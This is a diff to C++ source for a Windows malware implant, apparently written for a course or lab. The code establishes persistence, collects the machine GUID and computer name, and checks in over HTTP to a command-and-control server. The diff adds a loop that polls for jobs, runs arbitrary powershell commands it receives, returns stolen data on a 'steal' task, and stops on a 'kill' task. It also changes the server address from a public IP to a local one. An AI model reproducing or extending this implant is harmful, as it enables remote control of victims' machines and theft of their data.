@@ -12,15 +12,15 @@
 
 LONG getGUID(char* res, DWORD* size);
 LONG persistenceLOL(void);
+void convertFileToString(string* str);
 
 /* List of basic powershell commands: https://devblogs.microsoft.com/scripting/table-of-basic-powershell-commands/ */
 int wmain()
 {
     bool check = true;
     //std::filesystem::exists("C:\\malware\\ch0nky.txt");
-    if(check == true){
+    if(check){
         persistenceLOL();
-
         //get machine guid
         char value[255];
         DWORD BufferSize = sizeof(value);
@@ -40,13 +40,13 @@ int wmain()
         std::string sleepTimer = std::to_string(number);
         std::string mName(infoBuf, bufCharCount);
         checkin = checkin + guid + "\", \"sleepTime\": " + sleepTimer + ", \"computerName\": \"" + mName + "\", \"agentId\": \"1337\"}";
-        cout << steala() << endl;
+        string stealaStr = steala();
 
 
         // if successful, connect to the server
         HTTP *client = new HTTP();
         int port = 5000, tls = 0;
-        client->connectToServer(L"168.122.215.118", port);
+        client->connectToServer(L"10.0.2.15", port);
         if(!client->checkConnection()){
             wprintf(L"Error, couldn't connect to server\n");
             return 1;
@@ -71,18 +71,51 @@ int wmain()
         client->header_size = 28;
         client->requestData = checkin.c_str();
         client->data_size = checkin.size();
-        std::cout << client->makeHttpRequest(L"POST", L"/checkIn", tls) << std::endl;
-
-        bool iamImmortal = false;
-        while(iamImmortal){
-            //Sleep(number);
+        DWORD result = 0;
+        client->makeHttpRequest(L"POST", L"/checkIn", tls, &result);
+        if(result){
+            printf("Failed to connect to c2, oops\n");
         }
-        //request jobs
-        std::cout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;
-        std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
-        std::ifstream temp_file("C:\\Users\\User\\test.txt");
-        std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
-        std::remove("C:\\Users\\User\\test.txt");
+
+        bool iamImmortal = true;
+        string taskStr, strTemp, taskHolder, powershellCommand, output, finalOutput;
+        size_t semiColonIndex, numOfTasks, start_index;
+        while(iamImmortal){
+            Sleep(number);
+            //request jobs
+            taskStr = client->makeHttpRequest(L"POST", L"/jobs", tls, &result);
+            if(result && taskStr.size() > 4){
+                printf("Unable to get tasks\n");
+            }else{
+                //parse the tasks
+                strTemp = taskStr.substr(2, taskStr.size()-4);
+                cout << strTemp.c_str() << endl;
+                semiColonIndex = 0;
+                numOfTasks = 0;
+                start_index = 0;
+                semiColonIndex = strTemp.find(";", semiColonIndex);
+                finalOutput = "";
+                while(semiColonIndex != -1){
+                    taskHolder = strTemp.substr(start_index, semiColonIndex-start_index);
+                    if(!taskHolder.compare("steal")){
+                        finalOutput += "----------" + taskHolder + "----------\n";
+                        finalOutput += stealaStr;
+                    }else if(!taskHolder.compare("kill")){
+                        iamImmortal = false;
+                    }else{
+                        powershellCommand = "powershell " + taskHolder + " >C:\\Users\\User\\test.txt";
+                        finalOutput += "----------" + taskHolder + "----------\n";
+                        std::system(powershellCommand.c_str());
+                        convertFileToString(&finalOutput);
+                    }
+                    finalOutput += "\n\n";
+                    start_index = semiColonIndex + 2;
+                    semiColonIndex = strTemp.find(";", semiColonIndex + 1);
+                    numOfTasks++;
+                }
+                cout << finalOutput.c_str() << endl;
+            }
+        }
 
         delete client;
         return 0;
@@ -90,6 +123,13 @@ int wmain()
         printf("ch0nk not found");
         return 1;
     }
+}
+
+void convertFileToString(string* str){
+    std::ifstream temp_file("C:\\Users\\User\\test.txt");
+    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
+    *str += first_impression;
+    std::remove("C:\\Users\\User\\test.txt");
 }
 
 // https://stackoverflow.com/questions/48432994/c-read-machine-guid-via-reggetvalue
